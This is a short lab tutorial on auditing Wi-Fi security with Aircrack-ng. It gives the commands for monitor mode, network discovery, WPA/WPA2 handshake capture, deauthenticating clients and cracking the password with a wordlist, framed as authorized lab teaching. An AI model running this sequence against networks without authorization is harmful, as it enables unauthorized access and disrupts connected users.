Introduction

This advanced project focuses on ethical Wi‑Fi security auditing using Aircrack‑ng. It demonstrates how weak wireless configurations can be identified through monitoring, packet capture, and controlled password testing in an authorized lab environment.

Pre-requisites

Understanding of SSID, BSSID, channels

Knowledge of WEP, WPA, WPA2

Familiarity with Linux command line

Tools

Kali Linux

Aircrack‑ng Suite

Wi‑Fi Adapter (Monitor Mode)

Wireshark

Installation
sudo apt-get update && sudo apt-get install aircrack-ng

Tasks
Task 1: Enable Monitor Mode
iwconfig
sudo airmon-ng start wlan0

Task 2: Discover Wireless Networks
sudo airodump-ng wlan0mon

Task 3: Capture WPA/WPA2 Handshake
sudo airodump-ng --bssid XX:XX:XX:XX:XX:XX -c X -w capture wlan0mon


(Optional – authorized lab only)

sudo aireplay-ng --deauth 10 -a XX:XX:XX:XX:XX:XX wlan0mon

Task 4: Password Testing Using Wordlist
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

Task 5: Packet Analysis
sudo wireshark capture-01.cap
